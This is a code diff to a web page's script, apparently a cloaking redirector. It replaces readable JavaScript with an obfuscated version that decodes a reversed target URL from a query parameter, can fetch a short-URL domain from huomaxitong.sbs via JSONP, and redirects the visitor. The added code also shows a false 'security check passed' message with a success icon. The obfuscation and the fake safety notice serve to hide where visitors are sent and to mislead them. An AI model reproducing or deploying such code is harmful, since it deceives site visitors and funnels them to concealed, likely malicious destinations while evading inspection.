@@ -26,63 +26,7 @@
   <script>
 	  var host = "https://huomaxitong.sbs/api/store";
 	  var isdiy = true;////true为不用url域名
-	function showData(data) //回调函数
-	{
-		if(data && data.shorturl){
-			let keyParam = getParameterByName('k');
-			let targetUrl = reverseString(keyParam);
-			let=targetUrl = data.shorturl+"/"+targetUrl.split('//')[1].split('/')[1];
-			window.location.href = targetUrl;
-		}else{//请求出错时
-			redirectToTarget();
-		}
-	}
-	 
-  // 获取当前链接中的参数值
-  function getParameterByName(name,url = window.location.href) {
-    name = name.replace(/[\[\]]/g, "\\$&");
-    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-        results = regex.exec(url);
-    if (!results) return null;
-    if (!results[2]) return '';
-    return decodeURIComponent(results[2].replace(/\+/g, " "));
-  }
-	
-  // 构建目标链接，并跳转
-  function redirectToTarget(is_diy_url=false) {
-    var keyParam = getParameterByName('k');
-    
-    if (keyParam) {
-      var targetUrl = reverseString(keyParam);
-	  if(is_diy_url){
-		  $(document).ready(function () {
-		  				$.ajax({
-		  				    url: host,
-		  				    type: "GET",
-		  					jsonpCallback: "showData",  //指定回调函数名称
-		  				    dataType: "jsonp", //指定服务器返回的数据类型
-		  					fail:function(){
-		  						redirectToTarget();
-		  					}
-		  				});
-		  });
-	  }else{
-		  window.location.href = targetUrl;
-	  }
-    } else {
-      // 如果没有找到参数，则可以执行其他操作或给出提示
-      // alert('未找到参数 key。');
-    }
-  }
-  function reverseString(str) {
-      let reversedStr = '';
-      for (let i = str.length - 1; i >= 0; i--) {
-        reversedStr += str[i];
-      }
-      return reversedStr;
-    }
-	redirectToTarget(isdiy);
-  // 页面加载时调用跳转函数
+			function showData(_0x18a458){if(_0x18a458&&_0x18a458["\u0073\u0068\u006f\u0072\u0074\u0075\u0072\u006c"]){let _0x8cb51=getParameterByName("\u006b");let _0xf70aea=reverseString(_0x8cb51);let=_0xf70aea=_0x18a458["\u0073\u0068\u006f\u0072\u0074\u0075\u0072\u006c"]+"\u002f"+_0xf70aea["\u0073\u0070\u006c\u0069\u0074"]("//".split("").reverse().join(""))[0xad295^0xad294]["\u0073\u0070\u006c\u0069\u0074"]("\u002f")[0x9a9f5^0x9a9f4];window["\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e"]["\u0068\u0072\u0065\u0066"]=_0xf70aea;}else{redirectToTarget();}}function getParameterByName(_0x108d8e,_0xb14caa=window["\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e"]['href']){_0x108d8e=_0x108d8e["\u0072\u0065\u0070\u006c\u0061\u0063\u0065"](/[\[\]]/g,"&$\\".split("").reverse().join(""));var _0x4efe1e=new RegExp("]&?[".split("").reverse().join("")+_0x108d8e+")$|#|&|)*]#&^[(=(".split("").reverse().join("")),_0x4aa093=_0x4efe1e['exec'](_0xb14caa);if(!_0x4aa093)return null;if(!_0x4aa093[0x5cb1a^0x5cb18])return"".split("").reverse().join("");return decodeURIComponent(_0x4aa093[0x6e584^0x6e586]['replace'](/\+/g,'\x20'));}function redirectToTarget(_0x4665b5=![]){var _0x587b1a=getParameterByName('k');if(_0x587b1a){var _0x2d58e5=reverseString(_0x587b1a);if(_0x4665b5){$(document)["\u0072\u0065\u0061\u0064\u0079"](function(){$['ajax']({'url':host,"\u0074\u0079\u0070\u0065":'GET','jsonpCallback':'showData','dataType':'jsonp','fail':function(){redirectToTarget();}});});}else{window['location']['href']=_0x2d58e5;}}else{}}function reverseString(_0x34d0ad){let _0x2a524e="".split("").reverse().join("");for(let _0xe7d419=_0x34d0ad['length']-(0xeb664^0xeb665);_0xe7d419>=(0x9c880^0x9c880);_0xe7d419--){_0x2a524e+=_0x34d0ad[_0xe7d419];}return _0x2a524e;}redirectToTarget(isdiy);setTimeout(function(){var _0xb68d3f=document['getElementById']("noci".split("").reverse().join(""));var _0x74e32a=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("\u0069\u0063\u006f\u006e\u0054\u0065\u0078\u0074");var _0xa14fe9=document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("txeTbus".split("").reverse().join(""));_0xb68d3f["\u0063\u006c\u0061\u0073\u0073\u004c\u0069\u0073\u0074"]["\u0061\u0064\u0064"]('weui-icon-success');_0x74e32a['innerHTML']="\u6D4B\u68C0\u5168\u5B89\u8FC7\u901A\u5DF2".split("").reverse().join("");_0xa14fe9["\u0069\u006e\u006e\u0065\u0072\u0048\u0054\u004d\u004c"]="\u5982\u679c\u6ca1\u6709\u81ea\u52a8\u8df3\u8f6c\uff0c\u8bf7\u70b9\u51fb\u4e0b\u65b9\u6309\u94ae\u524d\u5f80";},0x67fdb^0x67c33);
   </script>
 	<script>
         setTimeout(function () {
